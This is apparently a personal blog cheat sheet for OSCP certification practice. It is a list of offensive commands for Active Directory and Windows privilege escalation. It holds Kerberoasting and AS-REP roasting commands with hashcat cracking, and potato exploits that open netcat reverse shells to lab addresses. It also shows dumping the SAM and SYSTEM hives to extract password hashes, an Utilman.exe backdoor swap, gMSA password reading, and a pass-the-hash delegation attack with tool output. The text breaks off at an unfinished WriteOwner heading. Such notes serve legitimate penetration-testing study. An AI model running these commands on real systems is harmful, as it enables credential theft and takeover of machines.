+++
date = '2026-04-28T20:19:35+09:00'
draft = false
title = 'OSCP_cheatsheet'
+++

# Kerberos

## Kerberoasting (service account)

- linux

```sh
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```
- windows

```cmd
Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat
```

hashcat:

`hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule`

## AS-REP Roasting (user account)

- windows

```powershell
.\Rubeus.exe asreproast /nowrap /outfile:hash.txt`
```

- linux

```sh
impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70
```

hashcat: 

`hashcat -m 18200 hash.txt /path/to/wordlist`

# Windows privileges

## SeImpersonatePrivilege

### sigmapotato

```powershell
.\SigmaPotato.exe --revshell 192.168.45.188 4444
```

```powershell
.\godpotato.exe -cmd "nc.exe 192.168.45.246 443 -e cmd"
```

```powershell
.\JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "/c C:\users\chen\nc.exe 192.168.45.226 443 -e cmd"
```

## SeBackupPrivilege

- copy SAM and SYSTEM files

```powershell
*Evil-WinRM* PS C:\users\anirudh> reg save hklm\sam ./sam
The operation completed successfully.

*Evil-WinRM* PS C:\users\anirudh> reg save hklm\system ./system
The operation completed successfully.
```

- download to kali machine

```powershell
*Evil-WinRM* PS C:\users\anirudh> download sam
Info: Downloading C:\users\anirudh\sam to sam
Info: Download successful!
*Evil-WinRM* PS C:\users\anirudh> download system
Info: Downloading C:\users\anirudh\system to system
Info: Download successful!
```

- extract credentials

```sh
impacket-secretsdump -system system -sam sam local                             
```

## SeRestorePrivilege

https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/serestoreprivilege

```powershell
.\EnableSeRestorePrivilege.ps1

ren C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.pwned
ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

rdesktop 192.168.134.165
```

# GPO

## ReadGMSAPassword

- target: svc_apache

```cmd
gmsapasswordreader.exe --accountname svc_apache
```

## GenericAll on Computer

![rbcd](/images/rbcd/genericall.png)

- add a fake computer

```sh
impacket-addcomputer resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'fake$' -computer-pass 'password!' -dc-ip 192.168.176.175 

[*] Successfully added machine account fake$ with password password!
```

- Delegate role

```sh
impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -delegate-from 'fake$' -delegate-to 'RESOURCEDC$' -action write -dc-ip 192.168.176.175

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] fake$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     fake$        (S-1-5-21-537427935-490066102-1511301751-4101)
```

## WriteOwner

valut machine